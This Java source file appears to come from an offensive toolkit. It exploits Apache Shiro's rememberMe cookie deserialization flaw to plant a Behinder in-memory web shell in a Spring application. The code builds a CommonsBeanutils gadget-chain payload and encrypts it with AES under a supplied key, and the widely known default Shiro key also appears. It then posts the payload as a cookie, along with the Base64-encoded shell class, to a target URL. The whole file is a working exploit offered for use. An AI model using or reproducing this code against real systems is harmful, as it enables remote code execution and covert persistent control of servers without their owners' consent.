package com.govuln.shiroattack.memshell;

import com.govuln.shiroattack.CommonsBeanutils1Shiro;
import com.govuln.shiroattack.asm.Resolver;
import javassist.ClassPool;
import javassist.CtClass;
import okhttp3.*;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;

import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;

public class Client_memshell_spring {
    public static void main(String vurl, String vkey) throws Exception {
        System.out.println("type: spring");

        ClassPool pool = ClassPool.getDefault();

        CtClass clazz = pool.get(ClassDataLoader.class.getName());

        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();

        String defaut = "kPH+bIxk5D2deZiIxcaaaA==";
        byte[] key = java.util.Base64.getDecoder().decode(vkey);

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());


        byte[] ciphertextbyte = ciphertext.getBytes();
        String loaderFileCookie = "rememberMe=" + Base64.encodeToString(ciphertextbyte);
        System.out.println("loader payload length: " + loaderFileCookie.length());

        OkHttpClient client = new OkHttpClient();
        String url = vurl;
        URI uri = Objects.requireNonNull(Client_memshell_tomcat.class.getResource("BehinderFilter_all.class")).toURI();

        Resolver.resolve("BehinderFilter_all.class");
        byte[] memShellBytes = Files.readAllBytes(Paths.get(uri));
        String memShellCode = Base64.encodeToString(memShellBytes);

        RequestBody body = new FormBody.Builder()
                .add("classData", memShellCode).build();
        Request loaderReq = new Request.Builder()
                .url(url)
                .addHeader("Cookie", loaderFileCookie)
                .post(body)
                .build();
        System.out.println(loaderFileCookie);
        System.out.println("classDatas=" + memShellCode);
        Call loaderCall = client.newCall(loaderReq);
        loaderCall.execute();
    }
}
